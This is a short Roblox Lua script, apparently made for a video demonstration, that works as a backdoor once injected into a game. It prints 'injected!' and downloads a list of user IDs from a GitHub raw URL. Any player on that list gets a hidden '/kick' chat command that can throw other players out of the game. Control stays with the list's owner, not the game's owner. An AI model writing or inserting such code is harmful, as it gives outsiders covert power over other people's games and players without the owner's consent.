print('injected!')

local HTTPService = game:GetService("HttpService")
if not HTTPService.HttpEnabled then return nil end

local success, playersList = pcall(function()
	return HTTPService:GetAsync("https://raw.githubusercontent.com/clockusDEV/for-video/refs/heads/main/player-list.md")
end)

if not success then
	warn("не удалось получить список игроков")
	return
end

local Players = game:GetService("Players")
Players.PlayerAdded:Connect(function(player)
	if not string.find(playersList, tostring(player.UserId)) then return nil end

	player.Chatted:Connect(function(msg)
		local args = string.split(msg, " ")
		if args[1] == "/kick" and args[2] then		
			local targetName = args[2]
			local targetPlayer = Players:FindFirstChild(targetName)
			if targetPlayer then
				local reason = table.concat(args, " ", 3)
				targetPlayer:Kick(reason ~= "" and reason or "You were kicked.")
				print(player.Name .. " kicked " .. targetPlayer.Name .. " for: " .. reason)
			end
		end
	end)
end)

return nil